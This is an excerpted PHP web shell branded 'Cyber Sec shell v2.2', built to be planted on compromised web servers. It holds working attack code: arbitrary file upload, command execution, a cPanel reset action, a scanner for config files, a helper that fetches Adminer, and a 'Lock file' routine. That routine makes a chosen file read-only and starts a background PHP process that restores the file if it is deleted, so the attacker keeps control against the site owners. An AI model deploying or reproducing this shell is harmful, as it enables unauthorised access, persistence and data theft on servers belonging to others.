...
<head>
    ...
    <meta name="author" content="Общий">
    <meta name="viewport" content="hackercat" />
...
function author() {
    echo "</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2025 &copy; Общий | Cyber Sec</center></td></table><br>";
    exit();
}
...
echo '<table class="header"><td><center>
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> Cyber Sec</a></center></div></td><td>';
...
if (isset($_GET['viewfile'])) {
    ...
    <input type='file' name='desan' id='cybersec' style='background-color: grey;' class='form-control' name='uplod'>
    <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>
     ...
     if (isset($_POST['uplod'])) {
        ...
        if (empty($_FILES['desan']['name'])) {
            ...
            $data = @file_put_contents($serlok."/".$_FILES['desan']['name'], @file_get_contents($_FILES['desan']['tmp_name']));
                if (file_exists($serlok."/".$_FILES['desan']['name'])) {
                    $fl = $serlok."/".$_FILES['desan']['name'];
                    echo "<br><table class='directory-listing-table' style='border-color:lime;'><td>
                    Uploaded => <font color='lime'><i>".$_FILES['desan']['name']."</i></font><br>";
...
<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
    ...
    <br> - Cyber Sec shell v2.2 <br> - Created by Общий</td></thead></table>"; exit();
} elseif ($_REQUEST[net('lokfile')] == "opet") {
    echo "<table class='directory-listing-table'><td>
    <h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='cybersec-text' style='font-size:12px;'><i> Linux</i></font></h5><hr style='color:#04FBFF;'>
    ...
    if (isset($_POST['submit'])) {
        ...
        $filez = $_POST['pile'];
        $tempe = "/tmp";
        if (file_exists($tempe.'/'.md5($serlok. $filez.'-xcybersec').cybersec_ex($filez).'xhand.Lock') && file_exists($tempe . '/'.cybersec_ex($filez).'-xopet')) {
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xopet').cybersec_ex($filez).'xcybersec.Lock', $serlok);
            cmd('rm -rf '.$tempe.'/'.md5($serlok. $filez.'-xcybersec').cybersec_ex($filez).'xhand.Lock', $serlok);
            }
            cmd("cp $filez ".$tempe."/".md5($serlok. $filez.'-xopet').cybersec_ex($filez).'xcybersec.Lock', $serlok);
            @chmod($filez, 0444);
            $content = '<?php
    $tmp = "/tmp";
    $fileperm = cybersec_perm("'.$filez.'");
    cybersec_cmd("chmod 444 '.$filez.'");
    while (True) {
        if (!file_exists("'.$filez.'")) {
            $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok. $filez.'-xopet').cybersec_ex($filez).'xcybersec.Lock"));
    ...
    function cybersec_perm($filez){
        return substr(sprintf("%o", fileperms($filez)), -4);
    }';
    $content = file_put_contents($tempe. "/" .md5($serlok. $filez.'-xcybersec'). cybersec_ex($filez).'xhand.Lock', $content);
    if ($content) {
        echo "<table class='directory-listing-table' style='border-color:lime;'><td>Locked => <font color='lime'>$filez</font></td></table>";
        cmd('php '. $tempe . '/' .md5($serlok. $filez.'-xcybersec').cybersec_ex($filez).'"xhand.Lock" > /dev/null 2>/dev/null &', $serlok);
    } else {
...
echo'</textarea><br>
<input type="hidden" class="input" name="folfig" value="cyberseccfg"/><br>
...
echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
    ...
    function crot($url){
        $cybersec = curl_init($url);
        curl_setopt($cybersec, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($cybersec, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($cybersec, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($cybersec, CURLOPT_HEADER, 0);
        return curl_exec($cybersec);
        curl_close($cybersec);
    } 
        echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> Adminer<font class='cybersec-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr><center>
    <form method='POST'>
    <div class='input-group' style='width:300px;'>
    <span class='input-group-text mb-2'>Filename :</span>
...
if(is_readable($serlok)){
            ...
            foreach($fetch as $fols){
                if($fols=='.'||$fols=='..'){
                    ...
                    $cybersecs=$serlok.'/'.$fols;
                    if(is_dir($cybersecs)){
                        array_push($serlokbos,$fols);
                    }elseif(is_file($cybersecs)){
